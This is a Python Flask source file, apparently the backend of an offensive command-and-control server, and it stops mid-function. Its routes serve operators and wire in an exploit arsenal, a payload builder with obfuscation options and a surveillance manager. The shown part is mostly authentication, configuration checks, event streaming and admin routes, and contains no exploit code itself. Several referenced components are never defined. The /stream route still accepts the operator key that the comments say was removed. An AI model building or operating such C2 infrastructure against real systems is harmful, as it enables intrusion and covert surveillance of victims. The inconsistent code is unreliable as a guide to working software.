"""
AEGIS-SILENTIUM v12 — C2 Server (app.py)
=========================================
Wire-up:
  * Structured JSON logging (observability/logging.py)
  * PostgreSQL connection pool with circuit breaker (db/pool.py)
  * JWT RBAC session management (auth/rbac.py)
  * Prometheus metrics on every request (observability/metrics.py)
  * Security headers + correlation IDs (middleware/security_headers.py)
  * Sliding-window rate limiter (middleware/rate_limiter.py)
  * Circuit breakers on Redis + Postgres (resilience/circuit_breaker.py)
  * Webhook dispatcher for all SSE events (webhooks/dispatcher.py)
  * Secret manager for key lifecycle (secrets/manager.py)
  * All v8 feature routes (listeners, exploits, payloads, surveillance, chat)
  * Admin routes: operator management, secret rotation, alert management
  * /metrics, /health, /ready endpoints

This file is the single entry-point for the Flask app.
"""

import os
import sys
import json
import time
import uuid
import threading

# ── Path setup ────────────────────────────────────────────────────────────────
sys.path.insert(0, os.path.dirname(__file__))

# ── Logging must be configured before any other import that logs ───────────
from observability.logging import (
    setup_logging, correlation_id, current_operator,
)
setup_logging(
    level       = os.environ.get("LOG_LEVEL", "INFO"),
    json_output = os.environ.get("LOG_FORMAT", "json") == "json",
)

import logging
log = logging.getLogger("aegis.c2")

from flask import redirect, Flask, g, jsonify, request, Response, stream_with_context
from flask_cors import CORS

# ── New subsystems ────────────────────────────────────────────────────────────
from db.pool                      import Pool
from auth.rbac                    import RBACManager, role_has, ROLES
from observability.metrics        import (
    REGISTRY, active_nodes, sse_clients, events_published,
    auth_attempts_total, db_pool_wait,
)
from middleware.security_headers  import init_security_headers
from middleware.rate_limiter      import RateLimiter, LIMITS
from resilience.circuit_breaker   import redis_breaker, postgres_breaker
from resilience.backoff           import retry
from secret_store.manager              import SecretManager
from webhooks.dispatcher          import WebhookDispatcher

# ── Feature managers ──────────────────────────────────────────────────────────
from listeners.manager    import ListenerDBManager, LISTENER_TYPES, C2_PROFILES
from exploits.arsenal     import (ExploitArsenal, EXPLOIT_TYPES, EXPLOIT_TARGETS,
                                   SEVERITY_LEVELS, EXPLOIT_STATUSES)
from payloads.builder     import (PayloadBuilder, PAYLOAD_TYPES, OUTPUT_FORMATS,
                                   OBFUSCATIONS, ARCHITECTURES, EXIT_FUNCTIONS)
from surveillance.manager import SurveillanceManager
from teamchat.manager     import TeamChatManager, VALID_CHANNELS

import redis
import psycopg2

# ══════════════════════════════════════════════════════════════════════════════
# APP BOOTSTRAP
# ══════════════════════════════════════════════════════════════════════════════

_VERSION = "12.0"

app = Flask(__name__)
# CORS — restrict to configured origins (default: same-origin only)
_CORS_ORIGINS_RAW = os.environ.get("CORS_ALLOWED_ORIGINS", "")
if _CORS_ORIGINS_RAW.strip() == "*":  # noqa: CORS-AUDIT - this BLOCKS wildcard
    # Wildcard CORS is prohibited — refuse to start with it configured
    import sys as _sys
    print("FATAL: CORS_ALLOWED_ORIGINS=* is prohibited — specify exact origins", flush=True)
    _sys.exit(1)
_CORS_ORIGINS = [o.strip() for o in _CORS_ORIGINS_RAW.split(",") if o.strip()]
CORS(app, resources={r"/api/*": {
    "origins":              _CORS_ORIGINS if _CORS_ORIGINS else [],
    "methods":              ["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"],
    "allow_headers":        ["Content-Type", "Authorization", "X-Correlation-ID"],
    "expose_headers":       ["X-Correlation-ID"],
    "supports_credentials": True,
    "max_age":              600,   # 10 minutes (was 1 hour — reduced to limit preflight caching)
}})

# Register security headers + metrics instrumentation
init_security_headers(app)

# ── Environment ───────────────────────────────────────────────────────────────
_ENV = {
    "OPERATOR_KEY":      os.environ.get("OPERATOR_KEY", ""),  # must be set via environment
    "REDIS_HOST":        os.environ.get("REDIS_HOST", "localhost"),
    "REDIS_PASSWORD":    os.environ.get("REDIS_PASSWORD", ""),
    "REDIS_PORT":        int(os.environ.get("REDIS_PORT", "6379")),
    "POSTGRES_HOST":     os.environ.get("POSTGRES_HOST", "localhost"),
    "POSTGRES_DB":       os.environ.get("POSTGRES_DB", "aegis"),
    "POSTGRES_USER":     os.environ.get("POSTGRES_USER", "aegis"),
    "POSTGRES_PASSWORD": os.environ.get("POSTGRES_PASSWORD", ""),  # must be set via environment
    "LOG_LEVEL":         os.environ.get("LOG_LEVEL", "INFO"),
}


# ── Startup safety checks ─────────────────────────────────────────────────────
import sys as _sys
if not _ENV["OPERATOR_KEY"]:
    log.critical("OPERATOR_KEY environment variable is not set. "
                 "Set it to a random string of at least 32 characters. Refusing to start.")
    _sys.exit(1)
if len(_ENV["OPERATOR_KEY"]) < 32:
    log.critical("OPERATOR_KEY is too short (%d chars). Must be >= 32 chars. Refusing to start.",
                 len(_ENV["OPERATOR_KEY"]))
    _sys.exit(1)
if not _ENV["POSTGRES_PASSWORD"]:
    log.warning("POSTGRES_PASSWORD not set — database connections will likely fail.")


# ══════════════════════════════════════════════════════════════════════════════
# STARTUP CONFIG VALIDATION
# ══════════════════════════════════════════════════════════════════════════════


def _validate_startup_config() -> None:
    """
    Strict startup validation. Any FATAL error calls sys.exit(1).
    Warnings are logged but do not block startup.
    Covers: auth keys, TLS, database, Redis, CORS, secret strength.
    """
    import hashlib, re as _re
    errors:   list = []
    warnings_: list = []

    # ── OPERATOR_KEY ──────────────────────────────────────────────────────
    operator_key = os.environ.get("OPERATOR_KEY", "")
    _PLACEHOLDER_KEYS = {
        "changeme", "default", "test", "demo", "aegis",
        "CHANGE_ME_use_48+_random_chars_from_openssl_ran",
        "your_operator_key_here", "operator_key", "secret",
    }
    if not operator_key:
        errors.append("OPERATOR_KEY not set — authentication is impossible without it")
    elif len(operator_key) < 48:
        errors.append(f"OPERATOR_KEY too short ({len(operator_key)} chars, minimum 48)")
    elif operator_key.lower() in _PLACEHOLDER_KEYS or "CHANGE_ME" in operator_key:
        errors.append("OPERATOR_KEY is a placeholder — generate with: openssl rand -hex 32")
    else:
        # Entropy check — reject low-entropy keys (all same char, sequential)
        unique_chars = len(set(operator_key))
        if unique_chars < 12:
            errors.append(f"OPERATOR_KEY has low entropy ({unique_chars} unique chars) — use openssl rand -hex 32")

    # ── JWT SECRET ────────────────────────────────────────────────────────
    jwt_secret = os.environ.get("C2_JWT_SECRET", "")
    _PLACEHOLDER_JWT = {"secret", "changeme", "default", "aegis", "jwt_secret", ""}
    if jwt_secret and jwt_secret.lower() in _PLACEHOLDER_JWT:
        errors.append("C2_JWT_SECRET is a placeholder — generate with: openssl rand -hex 48")
    elif jwt_secret and len(jwt_secret) < 32:
        errors.append(f"C2_JWT_SECRET too short ({len(jwt_secret)} chars, minimum 32)")

    # ── POSTGRES PASSWORD ─────────────────────────────────────────────────
    pg_password = os.environ.get("POSTGRES_PASSWORD", "")
    _WEAK_PG_PASSWORDS = {"password", "postgres", "admin", "changeme", "aegis", ""}
    if not pg_password:
        warnings_.append("POSTGRES_PASSWORD not set — database connections will fail at runtime")
    elif pg_password.lower() in _WEAK_PG_PASSWORDS:
        errors.append("POSTGRES_PASSWORD is a common/weak password — use a strong random password")
    elif len(pg_password) < 12:
        warnings_.append(f"POSTGRES_PASSWORD is short ({len(pg_password)} chars) — use 16+ chars")

    pg_host = os.environ.get("POSTGRES_HOST", "")
    if not pg_host:
        warnings_.append("POSTGRES_HOST not set — defaulting to localhost")

    # ── REDIS ─────────────────────────────────────────────────────────────
    redis_password = os.environ.get("REDIS_PASSWORD", "")
    redis_host = os.environ.get("REDIS_HOST", "")
    if not redis_host:
        warnings_.append("REDIS_HOST not set — defaulting to localhost")
    if not redis_password:
        warnings_.append("REDIS_PASSWORD not set — Redis is unauthenticated (secure only in private network)")

    # ── TLS / HTTPS ───────────────────────────────────────────────────────
    require_tls = os.environ.get("REQUIRE_TLS", "").lower()
    if require_tls not in ("1", "true", "yes"):
        warnings_.append(
            "REQUIRE_TLS not set — set REQUIRE_TLS=1 to enforce HTTPS redirects in production"
        )

    # ── CORS ──────────────────────────────────────────────────────────────
    cors_origins = os.environ.get("CORS_ALLOWED_ORIGINS", "")
    if cors_origins == "*":
        errors.append("CORS_ALLOWED_ORIGINS=* is wildcard — this allows any browser to access the API")
    elif not cors_origins:
        warnings_.append("CORS_ALLOWED_ORIGINS not set — API accessible only from same-origin requests")

    # ── WEBHOOK SECRET ────────────────────────────────────────────────────
    webhook_secret = os.environ.get("WEBHOOK_SECRET", "")
    if webhook_secret and "CHANGE_ME" in webhook_secret:
        warnings_.append("WEBHOOK_SECRET is still a placeholder — generate a real webhook signing secret")

    # ── ENVIRONMENT TAG ───────────────────────────────────────────────────
    env_tag = os.environ.get("AEGIS_ENV", "development").lower()
    if env_tag == "production":
        # In production: escalate all warnings to errors
        if not jwt_secret:
            errors.append("[PROD] C2_JWT_SECRET must be set in production")
        if not redis_password:
            errors.append("[PROD] REDIS_PASSWORD must be set in production")
        if require_tls not in ("1", "true", "yes"):
            errors.append("[PROD] REQUIRE_TLS must be set to 1 in production")
        if not pg_password or pg_password.lower() in _WEAK_PG_PASSWORDS:
            errors.append("[PROD] POSTGRES_PASSWORD must be strong in production")

    # ── Emit results ──────────────────────────────────────────────────────
    for w in warnings_:
        log.warning("CONFIG WARNING: %s", w)
    if errors:
        for e in errors:
            log.critical("FATAL CONFIG: %s", e)
        log.critical(
            "Refusing to start: %d critical configuration error(s). "
            "Fix the above and restart. See .env.example for guidance.",
            len(errors)
        )
        sys.exit(1)

    # ── Crypto library ───────────────────────────────────────────────────
    try:
        from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    except ImportError:
        if env_tag == "production":
            errors.append("[PROD] cryptography library missing — pip install cryptography>=43")
        else:
            warnings_.append("cryptography library missing — using WEAK fallback crypto")

    # Re-check errors after crypto check
    if errors:
        for e in errors:
            log.critical("FATAL CONFIG: %s", e)
        log.critical("Refusing to start: %d critical config error(s).", len(errors))
        sys.exit(1)

    log.info(
        "Startup config validation passed (env=%s, %d warnings, operator_key_len=%d)",
        env_tag, len(warnings_), len(operator_key)
    )

_validate_startup_config()


# ── TLS enforcement ───────────────────────────────────────────────────────────
@app.before_request
def _enforce_tls():
    """
    Redirect HTTP to HTTPS when REQUIRE_TLS=1.
    Adds HSTS header on all responses when TLS is enforced.
    """
    if os.environ.get("REQUIRE_TLS", "").lower() in ("1", "true", "yes"):
        if request.scheme == "http" and not request.headers.get("X-Forwarded-Proto") == "https":
            url = request.url.replace("http://", "https://", 1)
            return redirect(url, code=301)

@app.after_request
def _add_security_headers_tls(response):
    """Add HSTS, CSP, and security headers on every response."""
    # Content Security Policy — deny framing, restrict sources
    response.headers.setdefault(
        "Content-Security-Policy",
        "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data:; frame-ancestors 'none'; base-uri 'self';"
    )
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"]        = "DENY"
    response.headers["Referrer-Policy"]        = "strict-origin-when-cross-origin"
    response.headers["Permissions-Policy"]     = "geolocation=(), microphone=(), camera=()"
    if os.environ.get("REQUIRE_TLS", "").lower() in ("1", "true", "yes"):
        response.headers["Strict-Transport-Security"] = (
            "max-age=31536000; includeSubDomains; preload"
        )
    response.headers.setdefault("X-Frame-Options", "DENY")
    response.headers.setdefault("X-Content-Type-Options", "nosniff")
    response.headers.setdefault("Referrer-Policy", "no-referrer")
    response.headers.setdefault("Permissions-Policy", "geolocation=(), camera=(), microphone=()")
    response.headers.setdefault("Content-Security-Policy",
        "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'")
    return response

# ── Redis ─────────────────────────────────────────────────────────────────────
R: redis.Redis = None
try:
    _r_kwargs = dict(
        host      = _ENV["REDIS_HOST"],
        port      = _ENV["REDIS_PORT"],
        password  = _ENV["REDIS_PASSWORD"] or None,
        decode_responses = True,
        socket_timeout       = 2,
        socket_connect_timeout = 2,
        health_check_interval = 30,
    )
    R = redis.Redis(**_r_kwargs)
    R.ping()
    log.info("redis connected  host=%s", _ENV["REDIS_HOST"])
except Exception as e:
    log.warning("redis unavailable — running degraded  err=%s", e)
    R = None

# ── PostgreSQL pool ───────────────────────────────────────────────────────────
_pool: Pool = None
try:
    _pool = Pool.from_env()
    log.info("postgres pool ready")
except Exception as e:
    log.critical("postgres pool failed — FATAL  err=%s", e)


def get_pg():
    """Return a pooled connection (for manager compatibility)."""
    if _pool is None:
        raise RuntimeError("Database pool is not available.")
    # Update pool wait metric
    db_pool_wait.set(_pool.stats.get("wait_count", 0))
    return _pool._pool.getconn()


# ── Secret manager ────────────────────────────────────────────────────────────
_secret_mgr = SecretManager(get_pg, R) if R else None
_JWT_SECRET  = (
    _secret_mgr.get_jwt_secret() if _secret_mgr
    else _ENV["OPERATOR_KEY"].encode()
)

# ── RBAC manager ─────────────────────────────────────────────────────────────
_rbac: RBACManager = RBACManager(get_pg, R, _JWT_SECRET) if R else None

# ── Rate limiter ──────────────────────────────────────────────────────────────
_rl = RateLimiter(redis_client=R, fallback_to_memory=True)

# ── Webhook dispatcher ────────────────────────────────────────────────────────
_webhooks = WebhookDispatcher(get_pg)
_webhooks.start()

# ── Feature manager singletons ────────────────────────────────────────────────
_listener_mgr = _exploit_mgr = _payload_mgr = _surv_mgr = _chat_mgr = None

def _get_listener_mgr() -> ListenerDBManager:
    global _listener_mgr
    if not _listener_mgr:
        _listener_mgr = ListenerDBManager(get_pg, audit_fn=_emit_audit)
    return _listener_mgr

def _get_exploit_mgr() -> ExploitArsenal:
    global _exploit_mgr
    if not _exploit_mgr:
        _exploit_mgr = ExploitArsenal(get_pg, audit_fn=_emit_audit)
    return _exploit_mgr

def _get_payload_mgr() -> PayloadBuilder:
    global _payload_mgr
    if not _payload_mgr:
        _payload_mgr = PayloadBuilder(get_pg, audit_fn=_emit_audit)
    return _payload_mgr

def _get_surv_mgr() -> SurveillanceManager:
    global _surv_mgr
    if not _surv_mgr:
        _surv_mgr = SurveillanceManager(get_pg, audit_fn=_emit_audit)
    return _surv_mgr

def _get_chat_mgr() -> TeamChatManager:
    global _chat_mgr
    if not _chat_mgr:
        _chat_mgr = TeamChatManager(get_pg, emit_fn=emit, redis_client=R, audit_fn=_emit_audit)
    return _chat_mgr

# ── SSE subscriber registry ───────────────────────────────────────────────────
_sse_lock = threading.Lock()
_sse_subscribers: dict = {}

# ══════════════════════════════════════════════════════════════════════════════
# REQUEST HELPERS
# ══════════════════════════════════════════════════════════════════════════════

def _session():
    """Return current session (attached in before_request)."""
    return getattr(g, "_session", None)

def _operator():
    sess = _session()
    if sess:
        return sess.operator
    return (
        request.headers.get("X-Aegis-Operator", "")
        or (request.get_json(silent=True) or {}).get("operator", "")
        or "operator"
    )[:64]

def _role():
    sess = _session()
    return sess.role if sess else "operator"

def _pagination():
    try:    page = max(1, int(request.args.get("page", 1)))
    except (ValueError, TypeError): page = 1
    try:    per_page = min(500, max(1, int(request.args.get("per_page", 100))))
    except (ValueError, TypeError): per_page = 100
    return page, per_page

def _err(message: str, *, status: int = 400, fields: dict = None, code: str = None):
    body = {"error": message}
    if fields: body["fields"] = fields
    if code:   body["code"]   = code
    return jsonify(body), status

# ══════════════════════════════════════════════════════════════════════════════
# AUTHENTICATION & AUTHORIZATION DECORATORS
# ══════════════════════════════════════════════════════════════════════════════

def _require_auth(fn):
    """
    Verify Bearer JWT on every request.
    ONLY accepts Authorization: Bearer <jwt_token>.
    The legacy X-Aegis-Key header path has been REMOVED — it was a broad
    attack surface granting admin access via a single header value.
    All clients must authenticate via /api/auth/login and use JWT tokens.
    """
    import functools
    @functools.wraps(fn)
    def wrapper(*args, **kwargs):
        # ── JWT path (only auth path) ─────────────────────────────────────
        auth_header = request.headers.get("Authorization", "")
        if auth_header.startswith("Bearer ") and _rbac:
            token = auth_header[7:].strip()
            try:
                g._session = _rbac.verify_access_token(token)
                current_operator.set(g._session.operator)
                auth_attempts_total.inc({"result": "ok"})
                return fn(*args, **kwargs)
            except PermissionError as e:
                auth_attempts_total.inc({"result": "fail"})
                log.warning("auth fail  reason=%s  ip=%s", e, request.remote_addr)
                return _err(str(e), status=401, code="AUTH_INVALID")

        # ── Reject legacy key attempts (removed auth surface) ─────────────
        if (request.headers.get("X-Aegis-Key") or request.args.get("key")):
            log.warning(
                "Rejected legacy X-Aegis-Key auth attempt from %s — "
                "this auth path is disabled. Use JWT Bearer tokens.",
                request.remote_addr
            )
            auth_attempts_total.inc({"result": "legacy_rejected"})
            return _err(
                "Legacy key authentication is disabled. "
                "Use POST /api/auth/login to obtain a JWT token.",
                status=401, code="LEGACY_AUTH_DISABLED"
            )

        auth_attempts_total.inc({"result": "missing"})
        return _err("Authentication required. Use Bearer JWT token.", status=401, code="AUTH_MISSING")
    return wrapper

def _require_permission(permission: str):
    """Decorator: require a specific RBAC permission."""
    def decorator(fn):
        import functools
        @functools.wraps(fn)
        @_require_auth
        def wrapper(*args, **kwargs):
            sess = _session()
            if sess and not role_has(sess.role, permission):
                log.warning(
                    "permission denied  op=%s  role=%s  required=%s  path=%s",
                    sess.operator, sess.role, permission, request.path,
                )
                return _err(
                    f"Permission denied: '{permission}' required.",
                    status=403, code="FORBIDDEN",
                )
            return fn(*args, **kwargs)
        return wrapper
    return decorator

def _require_rate(preset: str = "operator_api"):
    """Decorator: apply rate limiting by operator + IP."""
    def decorator(fn):
        import functools
        @functools.wraps(fn)
        def wrapper(*args, **kwargs):
            sess = _session()
            key  = sess.operator if sess else request.remote_addr
            role = sess.role if sess else "operator"
            allowed, headers = _rl.check(key, preset=preset, role=role)
            if not allowed:
                r = jsonify({"error": "Rate limit exceeded.", "code": "RATE_LIMITED"})
                r.status_code = 429
                for k, v in headers.items():
                    r.headers[k] = v
                return r
            resp = fn(*args, **kwargs)
            if hasattr(resp, "headers"):
                for k, v in headers.items():
                    resp.headers[k] = v
            return resp
        return wrapper
    return decorator

# Shorthand for most API routes
_require_operator = _require_permission("dashboard:view")

# ══════════════════════════════════════════════════════════════════════════════
# SSE + EMIT
# ══════════════════════════════════════════════════════════════════════════════

def emit(event_type: str, message: str, severity: str = "info") -> None:
    """Publish an event to all SSE clients and to the webhook dispatcher."""
    payload = {
        "event_type": event_type,
        "message":    message,
        "severity":   severity,
        "ts":         time.time(),
        "id":         uuid.uuid4().hex[:8],
    }
    # Redis pub/sub
    if R:
        try:
            with redis_breaker:
                R.publish("aegis:events", json.dumps(payload))
        except Exception as _exc:
            log.debug("emit: %s", _exc)
    # In-process SSE
    with _sse_lock:
        dead = []
        for sid, q in _sse_subscribers.items():
            try:
                q.put_nowait(payload)
            except Exception:
                dead.append(sid)
        for sid in dead:
            _sse_subscribers.pop(sid, None)
    # Webhook dispatch (async)
    _webhooks.enqueue(event_type, payload)
    # Metrics
    events_published.inc({"kind": event_type, "severity": severity})

    # Persist to DB
    _persist_event(event_type, message, severity)
    # Write to streaming event log
    if _event_log:
        try:
            _event_log.write(topic="c2.events", event_type=event_type,
                             payload=payload, source="c2")
        except Exception as _exc:
            log.debug("unknown: %s", _exc)
    # Dispatch to plugin hooks
    if _plugin_engine and _PLUGINS_AVAILABLE:
        try:
            _plugin_engine.dispatch_async(PluginHook.ON_EVENT, payload)
        except Exception as _exc:
            log.debug("unknown: %s", _exc)

def _persist_event(kind: str, message: str, severity: str) -> None:
    try:
        with _pool.cursor() as cur:
            cur.execute(
                "INSERT INTO events(event_type, message, severity) VALUES(%s,%s,%s)",
                (kind, message[:500], severity),
            )
    except Exception as _exc:
        log.debug("_persist_event: %s", _exc)

def _emit_audit(kind: str, message: str, meta: dict = None) -> None:
    try: emit(kind, message, "info")
    except Exception as _e: log.debug("suppressed exception: %s", _e)

# ══════════════════════════════════════════════════════════════════════════════
# BEFORE/AFTER REQUEST HOOKS
# ══════════════════════════════════════════════════════════════════════════════

@app.before_request
def _before():
    g.corr_id = request.headers.get("X-Correlation-ID") or uuid.uuid4().hex[:16]
    g.t_start = time.monotonic()
    correlation_id.set(g.corr_id)

@app.after_request
def _after(resp):
    resp.headers["X-Correlation-ID"] = getattr(g, "corr_id", "")
    return resp

# ══════════════════════════════════════════════════════════════════════════════
# INFRASTRUCTURE ENDPOINTS
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/health")
@app.route("/api/health")
def health():
    """Liveness probe: always returns 200 if process is running."""
    return jsonify({"status": "ok", "ts": time.time()})

@app.route("/api/subsystems/health", methods=["GET"])
@_require_permission("nodes:view")
def subsystems_health():
    """
    Detailed runtime health probe for every subsystem.
    Returns per-subsystem status: ok / degraded / unavailable.
    Used by operators and monitoring systems to confirm end-to-end functionality.
    """
    import time as _t
    results = {}

    # PostgreSQL
    try:
        if _pool:
            conn = _pool.getconn()
            with conn.cursor() as cur:
                cur.execute("SELECT 1")
            _pool.putconn(conn)
            results["postgres"] = {"status": "ok"}
        else:
            results["postgres"] = {"status": "unavailable", "reason": "pool not initialised"}
    except Exception as _e:
        results["postgres"] = {"status": "unavailable", "reason": str(_e)[:80]}

    # Redis
    try:
        if R:
            R.ping()
            results["redis"] = {"status": "ok"}
        else:
            results["redis"] = {"status": "unavailable", "reason": "not connected"}
    except Exception as _e:
        results["redis"] = {"status": "unavailable", "reason": str(_e)[:80]}

    # RBAC
    results["rbac"] = {"status": "ok" if _rbac else "degraded",
                        "reason": None if _rbac else "RBAC manager not initialised"}

    # Intelligence
    results["ioc_manager"] = {"status": "ok" if _ioc_mgr else "unavailable"}
    results["threat_graph"] = {"status": "ok" if _threat_graph else "unavailable"}
    results["mitre_mapper"] = {"status": "ok" if _mitre_mapper else "unavailable"}

    # Webhooks
    results["webhooks"] = {"status": "ok" if _webhook_dispatcher else "unavailable"}

    # Distributed
    results["distributed"] = {
        "status":  "ok" if _DISTRIBUTED_AVAILABLE else "unavailable",
        "wal":     "ok" if _wal else "unavailable",
        "service_registry": "ok" if _service_registry else "unavailable",
    }

    # ZeroDay pipeline
    results["zeroday"] = {"status": "ok" if _zd_pipeline else "unavailable"}

    # Compute overall
    statuses = [v.get("status") if isinstance(v, dict) else "ok" for v in results.values()]
    if all(s == "ok" for s in statuses):
        overall = "healthy"
    elif any(s == "unavailable" for s in statuses):
        overall = "degraded"
    else:
        overall = "degraded"

    http_code = 200 if overall == "healthy" else 207
    return jsonify({
        "overall": overall,
        "timestamp": _t.time(),
        "subsystems": results,
    }), http_code


@app.route("/ready")
def ready():
    """Kubernetes/load-balancer readiness probe. Returns 200 OK or 503."""
    # Minimal response — does not expose subsystem details
    db_ok = bool(_pool)
    if db_ok:
        return jsonify({"status": "ready"}), 200
    return jsonify({"status": "starting"}), 503


@app.route("/metrics")
@app.route("/api/metrics")
@_require_permission("settings:view")
def metrics():
    """Prometheus text exposition. Auth required to prevent metadata leakage."""
    # Update DB pool gauge
    if _pool:
        db_pool_wait.set(_pool.stats.get("wait_count", 0))
    return Response(REGISTRY.render_all(), mimetype="text/plain; version=0.0.4")

@app.route("/api/status")
@_require_operator
def api_status():
    """Full system status: circuit breakers, pool stats, Redis info."""
    from resilience.circuit_breaker import redis_breaker, postgres_breaker, nvd_breaker
    return jsonify({
        "version":   "12.0",
        "ts":        time.time(),
        "pool":      _pool.stats if _pool else {},
        "circuit_breakers": {
            "redis":    redis_breaker.info,
            "postgres": postgres_breaker.info,
            "nvd":      nvd_breaker.info,
        },
        "webhooks": {
            "queue_size": _webhooks._queue.qsize(),
        },
    })

# ── SSE stream ────────────────────────────────────────────────────────────────

import queue as _queue_mod

@app.route("/stream")
def stream():
    key = request.args.get("key", "")
    if key != _ENV["OPERATOR_KEY"]:
        # Also accept JWT
        auth = request.headers.get("Authorization", "")
        if not (auth.startswith("Bearer ") and _rbac):
            return _err("Unauthorized", status=401)
        try:
            _rbac.verify_access_token(auth[7:])
        except PermissionError:
            return _err("Unauthorized", status=401)

    sid = uuid.uuid4().hex
    q: _queue_mod.Queue = _queue_mod.Queue(maxsize=500)
    with _sse_lock:
        _sse_subscribers[sid] = q
    sse_clients.inc()

    def _gen():
        try:
            yield "data: {\"event_type\":\"connected\",\"ts\":" + str(time.time()) + "}\n\n"
            while True:
                try:
                    payload = q.get(timeout=25)
                    yield f"data: {json.dumps(payload)}\n\n"
                except _queue_mod.Empty:
                    yield ": keepalive\n\n"
        except GeneratorExit:
            pass
        finally:
            with _sse_lock:
                _sse_subscribers.pop(sid, None)
            sse_clients.dec()

    return Response(
        stream_with_context(_gen()),
        mimetype="text/event-stream",
        headers={
            "Cache-Control":  "no-cache",
            "X-Accel-Buffering": "no",
            "Connection":     "keep-alive",
        },
    )

# ══════════════════════════════════════════════════════════════════════════════
# AUTHENTICATION ROUTES
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/auth/login", methods=["POST"])
@_require_rate("auth")
def auth_login():
    """
    Authenticate and receive JWT tokens.
    Body: { "handle": str, "key": str }
    """
    d = request.get_json(silent=True) or {}
    handle = d.get("handle", "").strip()
    key    = d.get("key", d.get("operator_key", "")).strip()  # accept both field names
    if not handle or not key:
        return _err("handle and key are required.", status=400)
    if not _rbac:
        return _err("RBAC not available (Redis required).", status=503)
    try:
        result = _rbac.authenticate(
            handle, key,
            ip = request.remote_addr or "",
            ua = request.headers.get("User-Agent", "")[:256],
        )
        return jsonify(result)
    except PermissionError as e:
        return _err(str(e), status=401, code="AUTH_INVALID")
    except Exception as e:
        log.error("auth_login error: %s", e)
        return _err("Authentication service unavailable.", status=503, code="AUTH_UNAVAILABLE")

@app.route("/api/auth/refresh", methods=["POST"])
def auth_refresh():
    d = request.get_json(silent=True) or {}
    refresh_token = d.get("refresh_token", "").strip()
    if not refresh_token:
        return _err("refresh_token is required.", status=400)
    if not _rbac:
        return _err("RBAC not available.", status=503)
    try:
        result = _rbac.refresh(refresh_token, ip=request.remote_addr)
        return jsonify(result)
    except PermissionError as e:
        return _err(str(e), status=401, code="TOKEN_EXPIRED")

@app.route("/api/auth/logout", methods=["POST"])
@_require_auth
def auth_logout():
    sess = _session()
    if sess and _rbac:
        _rbac.revoke(sess.jti, sess.operator)
    return jsonify({"status": "logged_out"})

@app.route("/api/auth/me")
@_require_auth
def auth_me():
    sess = _session()
    if not sess:
        return _err("No session.", status=401)
    return jsonify({
        "operator":   sess.operator,
        "role":       sess.role,
        "expires":    sess.expires,
        "jti_prefix": sess.jti[:8] + "…",
    })

# ══════════════════════════════════════════════════════════════════════════════
# ADMIN — OPERATOR MANAGEMENT
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/admin/operators", methods=["GET"])
@_require_permission("operators:view")
def admin_list_operators():
    if not _rbac:
        return _err("RBAC not available.", status=503)
    return jsonify({"operators": _rbac.list_operators()})

@app.route("/api/admin/operators", methods=["POST"])
@_require_permission("operators:create")
def admin_create_operator():
    if not _rbac:
        return _err("RBAC not available.", status=503)
    d = request.get_json(silent=True) or {}
    handle = d.get("handle", "").strip()
    key    = d.get("key", "").strip()
    role   = d.get("role", "operator").strip()
    if not handle or not key:
        return _err("handle and key are required.", status=400)
    try:
        row = _rbac.create_operator(handle, key, role, created_by=_operator())
        emit("operator_created", f"Operator '{handle}' created with role '{role}'")
        return jsonify(row), 201
    except (ValueError, RuntimeError) as e:
        return _err(str(e), status=409 if "exists" in str(e) else 400)

@app.route("/api/admin/operators/<handle>/role", methods=["PATCH"])
@_require_permission("operators:set_role")
def admin_set_role(handle: str):
    d    = request.get_json(silent=True) or {}
    role = d.get("role", "").strip()
    if not role:
        return _err("role is required.", status=400)
    try:
        _rbac.set_role(handle, role, by=_operator())
        return jsonify({"status": "updated", "handle": handle, "role": role})
    except (ValueError, KeyError) as e:
        return _err(str(e), status=400 if isinstance(e, ValueError) else 404)

@app.route("/api/admin/operators/<handle>/deactivate", methods=["POST"])
@_require_permission("operators:deactivate")
def admin_deactivate(handle: str):
    try:
        _rbac.deactivate(handle, by=_operator())
        return jsonify({"status": "deactivated", "handle": handle})
    except Exception as e:
        return _err(str(e), status=500)

@app.route("/api/admin/operators/<handle>/sessions/revoke", methods=["POST"])
@_require_permission("operators:deactivate")
def admin_revoke_sessions(handle: str):
    n = _rbac.revoke_all(handle, by=_operator())
    return jsonify({"revoked": n, "handle": handle})

@app.route("/api/admin/audit", methods=["GET"])
@_require_permission("audit:view")
def admin_audit():
    handle = request.args.get("operator") or None
    action = request.args.get("action") or None
    limit  = min(500, max(1, int(request.args.get("limit", 100))))
    offset = max(0, int(request.args.get("offset", 0)))
    rows   = _rbac.get_audit_trail(handle=handle, limit=limit, offset=offset, action=action)
    return jsonify({"audit": rows, "count": len(rows)})

# ══════════════════════════════════════════════════════════════════════════════
# ADMIN — SECRETS & KEY ROTATION
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/admin/secrets/rotate/jwt", methods=["POST"])
@_require_permission("secrets:rotate")
def rotate_jwt():
    if not _secret_mgr:
        return _err("Secret manager unavailable.", status=503)
    result = _secret_mgr.rotate_jwt_secret(rotated_by=_operator())
    emit("jwt_secret_rotated", f"JWT secret rotated by {_operator()}", "warning")
    # Update in-memory reference
    global _JWT_SECRET
    _JWT_SECRET = result["secret"].encode()
    return jsonify({k: v for k, v in result.items() if k != "secret"})

@app.route("/api/admin/secrets/rotate/fernet", methods=["POST"])
@_require_permission("secrets:rotate")
def rotate_fernet():
    if not _secret_mgr:
        return _err("Secret manager unavailable.", status=503)
    result = _secret_mgr.rotate_fernet_key(rotated_by=_operator())
    emit("fernet_key_rotated", f"Fernet key rotated by {_operator()}", "warning")
    return jsonify(result)

@app.route("/api/admin/secrets/history/<name>")
@_require_permission("secrets:rotate")
def secret_history(name: str):
    if not _secret_mgr:
        return _err("Secret manager unavailable.", status=503)
    return jsonify({"history": _secret_mgr.rotation_history(name)})

# ══════════════════════════════════════════════════════════════════════════════
# ADMIN — WEBHOOKS
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/api/webhooks", methods=["GET"])
@_require_permission("settings:view")
def list_webhooks():
